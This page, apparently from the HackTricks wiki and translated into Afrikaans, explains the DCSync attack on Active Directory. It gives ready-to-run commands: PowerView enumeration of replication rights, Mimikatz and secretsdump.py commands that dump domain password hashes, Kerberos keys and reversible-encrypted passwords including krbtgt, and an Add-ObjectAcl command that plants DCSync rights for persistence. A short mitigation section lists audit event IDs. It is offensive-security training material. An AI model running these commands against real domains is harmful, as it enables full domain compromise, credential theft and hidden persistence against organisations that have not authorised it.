# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Die **DCSync** toestemming impliseer dat jy hierdie toestemmings oor die domein self het: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** en **Replicating Directory Changes In Filtered Set**.

**Belangrike Aantekeninge oor DCSync:**

- Die **DCSync-aanval simuleer die gedrag van 'n Domeinbeheerder en vra ander Domeinbeheerders om inligting te repliseer** met behulp van die Directory Replication Service Remote Protocol (MS-DRSR). Omdat MS-DRSR 'n geldige en noodsaaklike funksie van Active Directory is, kan dit nie afgeskakel of gedeaktiveer word nie.
- Standaard het slegs **Domein Administrators, Enterprise Administrators, Administrators, en Domeinbeheerders** groepe die vereiste voorregte.
- As enige rekening wagwoorde met omkeerbare kodering gestoor word, is daar 'n opsie beskikbaar in Mimikatz om die wagwoord in duidelike teks terug te gee.

### Enumeration

Kontroleer wie hierdie toestemmings het met `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Exploit Plaaslik
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploit Afstandelik
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` genereer 3 lêers:

- een met die **NTLM hashes**
- een met die **Kerberos sleutels**
- een met duidelike wagwoorde van die NTDS vir enige rekeninge wat met [**omkeerbare versleuteling**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) geaktiveer is. Jy kan gebruikers met omkeerbare versleuteling kry met

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Volharding

As jy 'n domein admin is, kan jy hierdie toestemmings aan enige gebruiker toeken met die hulp van `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Dan kan jy **kontroleer of die gebruiker korrek toegeken is** aan die 3 voorregte deur daarna te soek in die uitvoer van (jy behoort die name van die voorregte binne die "ObjectType" veld te kan sien):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Versagting

- Sekuriteit Gebeurtenis ID 4662 (Auditsbeleid vir objek moet geaktiveer wees) – 'n Operasie is op 'n objek uitgevoer
- Sekuriteit Gebeurtenis ID 5136 (Auditsbeleid vir objek moet geaktiveer wees) – 'n Gidsdiens objek is gewysig
- Sekuriteit Gebeurtenis ID 4670 (Auditsbeleid vir objek moet geaktiveer wees) – Toestemmings op 'n objek is verander
- AD ACL Scanner - Skep en vergelyk skep verslae van ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Verwysings

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}
